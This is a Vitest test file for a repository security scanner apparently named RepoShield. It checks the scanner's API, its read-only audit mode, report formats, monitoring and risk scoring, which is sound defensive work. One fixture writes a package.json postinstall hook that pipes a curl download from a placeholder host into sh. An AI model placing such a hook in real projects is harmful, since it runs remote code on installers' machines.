import fs from "node:fs";
import { describe, expect, it } from "vitest";
import * as api from "../src/index.js";
import { aggregateRisk, riskLevel, scoreFindings, BASE_SCORE } from "../src/core/scoring.js";
import type { RawFinding } from "../src/rules/types.js";
import { fixture, project, snapshot } from "./helpers/project.js";

describe("public API", () => {
  it("exports the documented functions", () => {
    for (const n of [
      "clean",
      "scan",
      "scanFile",
      "compareWithBaseline",
      "generateReport",
      "inspectRecovery",
      "monitor",
      "createBaseline",
    ]) {
      expect(typeof (api as Record<string, unknown>)[n], n).toBe("function");
    }
  });

  it("clean() scans and reports without modifying anything", async () => {
    const root = project({
      "src/a.js": fixture("malicious/decode-exec.js.txt"),
      "package.json": JSON.stringify({ scripts: { postinstall: "curl http://x.invalid | sh" } }),
      "vite.config.js": fixture("malicious/vite.config.js.txt"),
    });
    const before = snapshot(root);
    const report = await api.clean({
      root,
      mode: "audit",
      includeGitHistory: true,
      baseline: true,
      failOn: "high",
      ignore: ["dist/**", "coverage/**"],
    });
    expect(report.safe).toBe(false);
    expect(report.summary.activeFindings).toBeGreaterThan(0);
    expect(snapshot(root)).toBe(before);
    expect(fs.existsSync(`${root}/src/a.js`)).toBe(true);
  });

  it("generateReport supports text, json and sarif and rejects unknown formats", async () => {
    const report = await api.scan({ root: project({ "a.js": fixture("malicious/shell-pipe.js.txt") }) });
    expect(api.generateReport(report)).toMatch(/RepoShield/);
    expect(JSON.parse(api.generateReport(report, { format: "json" })).findings.length).toBeGreaterThan(0);
    expect(JSON.parse(api.generateReport(report, { format: "sarif" })).version).toBe("2.1.0");
    expect(() => api.generateReport(report, { format: "html" as never })).toThrow(/Unknown report format/);
  });

  it("monitor does not start on import, rescans on an interval, and stops cleanly", async () => {
    const root = project({ "a.js": "export {}" });
    const seen: number[] = [];
    const handle = api.monitor(
      { root, monitorIntervalMs: 1000 },
      { onReport: (_r, i) => void seen.push(i.cycle) },
    );
    await new Promise((r) => setTimeout(r, 1500));
    expect(seen.length).toBeGreaterThanOrEqual(2);
    fs.writeFileSync(`${root}/b.js`, fixture("malicious/shell-pipe.js.txt"));
    await handle.stop();
    const n = seen.length;
    await new Promise((r) => setTimeout(r, 1200));
    expect(seen.length).toBe(n);
  });

  it("monitor reports newly appearing findings and honors an abort signal", async () => {
    const root = project({ "a.js": "export {}" });
    const c = new AbortController();
    const fresh: string[] = [];
    const handle = api.monitor(
      { root, monitorIntervalMs: 1000, signal: c.signal },
      { onReport: (_r, i) => void fresh.push(...i.newFindings.map((f) => f.ruleId)) },
    );
    await new Promise((r) => setTimeout(r, 300));
    fs.writeFileSync(`${root}/b.js`, fixture("malicious/shell-pipe.js.txt"));
    await new Promise((r) => setTimeout(r, 1500));
    c.abort();
    await handle.done;
    expect(fresh).toContain("RS-PROC-002");
  });

  it("package version matches VERSION", () => {
    const pkg = JSON.parse(fs.readFileSync(new URL("../package.json", import.meta.url), "utf8"));
    expect(api.VERSION).toBe(pkg.version);
  });
});

describe("scoring", () => {
  const raw = (o: Partial<RawFinding>): RawFinding => ({
    ruleId: "RS-EXEC-001",
    title: "t",
    category: "dynamic-execution",
    severity: "medium",
    confidence: "high",
    file: "a.js",
    message: "m",
    evidence: [],
    recommendation: "r",
    key: "k",
    ...o,
  });

  it("starts from the severity base and never lowers severity", () => {
    const [f] = scoreFindings([raw({ confidence: "low" })], () => false);
    expect(f!.severity).toBe("medium");
    expect(f!.score).toBe(BASE_SCORE.medium - 10);
    expect(f!.scoreFactors.map((x) => x.name)).toEqual(["severity", "confidence"]);
  });

  it("escalates one level for newly introduced findings in sensitive locations", () => {
    const [f] = scoreFindings([raw({ sensitiveLocation: true })], () => true);
    expect(f!.severity).toBe("high");
    const [g] = scoreFindings([raw({ severity: "critical", sensitiveLocation: true })], () => true);
    expect(g!.severity).toBe("critical");
    expect(g!.score).toBeLessThanOrEqual(100);
  });

  it("gives the same construct distinct fingerprints and stable ones across runs", () => {
    const a = scoreFindings([raw({}), raw({})], () => false);
    const b = scoreFindings([raw({}), raw({})], () => false);
    expect(a[0]!.fingerprint).not.toBe(a[1]!.fingerprint);
    expect(a.map((x) => x.fingerprint)).toEqual(b.map((x) => x.fingerprint));
  });

  it("documents risk levels", () => {
    expect(riskLevel(0)).toBe("none");
    expect(riskLevel(24)).toBe("low");
    expect(riskLevel(49)).toBe("elevated");
    expect(riskLevel(74)).toBe("high");
    expect(riskLevel(75)).toBe("critical");
    expect(aggregateRisk([])).toBe(0);
  });
});
